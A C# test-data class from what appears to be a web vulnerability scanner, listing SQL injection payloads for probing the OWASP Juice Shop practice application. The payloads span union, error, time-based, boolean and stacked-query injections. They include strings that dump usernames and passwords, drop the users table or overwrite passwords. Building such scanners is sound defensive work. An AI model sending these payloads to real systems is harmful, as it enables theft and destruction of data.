using System.ComponentModel;
using WebVulnerabilitiesScanner.Entities;

namespace WebVulnerabilitiesScanner.TestData
{
    /// <summary>
    /// Тестовые данные для SQL-инъекции
    /// </summary>
    public abstract class SqlInjectionTestData
    {
        public const int TimeValueForTimeBasedBlind_s = 5;

        /// <summary>
        /// Тип портала
        /// </summary>
        public enum PortalType
        {
            [Description("OWASP JuiceShop")]
            JuiceShop = 1,
        }

        /// <summary>
        /// Эндпоинты для GET-запросов
        /// </summary>
        public abstract List<string> GetRequestEndpoints { get; }

        /// <summary>
        /// Данные для POST-запросов
        /// </summary>
        public abstract List<PostRequestParams> PostRequestsInfo { get; }


        /// <summary>
        /// Универсальные нагрузки для тестирования запросов
        /// </summary>
        public static readonly List<RequestSqlInjectionPayloadEntity> BasePayloadsInfo = new List<RequestSqlInjectionPayloadEntity>()
        {
            new RequestSqlInjectionPayloadEntity("admin'--", SqlInjectionType.ClassicSqlInjection),
            new RequestSqlInjectionPayloadEntity("admin'#", SqlInjectionType.ClassicSqlInjection),
            new RequestSqlInjectionPayloadEntity("admin'/*", SqlInjectionType.ClassicSqlInjection),

            new RequestSqlInjectionPayloadEntity("' UNION SELECT 1,2,3--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT username,password FROM users--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT null,version()--", SqlInjectionType.UnionBased),

            new RequestSqlInjectionPayloadEntity("' AND 1=CAST((SELECT version()) AS INT)--", SqlInjectionType.ErrorBased),
            new RequestSqlInjectionPayloadEntity("' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--", SqlInjectionType.ErrorBased),

            new RequestSqlInjectionPayloadEntity($"' AND SLEEP({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"'; WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' AND (SELECT * FROM (SELECT(SLEEP({TimeValueForTimeBasedBlind_s})))a)--", SqlInjectionType.TimeBasedBlind),

            new RequestSqlInjectionPayloadEntity("' OR '1'='1", SqlInjectionType.BooleanBased),
            new RequestSqlInjectionPayloadEntity("' OR 1=1--", SqlInjectionType.BooleanBased),
            new RequestSqlInjectionPayloadEntity("' OR 1=1#", SqlInjectionType.BooleanBased),
            new RequestSqlInjectionPayloadEntity("' OR 1=1/*", SqlInjectionType.BooleanBased),
            new RequestSqlInjectionPayloadEntity("' AND 1=1--", SqlInjectionType.BooleanBased),
            new RequestSqlInjectionPayloadEntity("' AND 1=2--", SqlInjectionType.BooleanBased),

            new RequestSqlInjectionPayloadEntity("'; DROP TABLE users--", SqlInjectionType.StackedQueries),
            new RequestSqlInjectionPayloadEntity("'; UPDATE users SET password='hacked'--", SqlInjectionType.StackedQueries),
        };

        /// <summary>
        /// Получение тестовых данных (эндпоинты и данные для GET и POST запросов) для конкретного типа портала
        /// </summary>
        /// <param name="portalType">Тип портала</param>
        /// <param name="getRequestEndpoints">Эндпоинты для GET запросов</param>
        /// <param name="postRequestsInfo">Информация для POST запросов</param>
        /// <exception cref="Exception"></exception>
        public static void GetTestDataByPortalType(PortalType portalType, out List<string> getRequestEndpoints, out List<PostRequestParams> postRequestsInfo) 
        {
            if (portalType == PortalType.JuiceShop)
            {
                var juiceShopTestDataInstance = new JuiceShopTestData();
                getRequestEndpoints = juiceShopTestDataInstance.GetRequestEndpoints;
                postRequestsInfo = juiceShopTestDataInstance.PostRequestsInfo;
                return;
            }
            else 
            {
                throw new Exception($"Не удалось получить тестовые данные для портала {portalType}");
            }
        }
    }
}
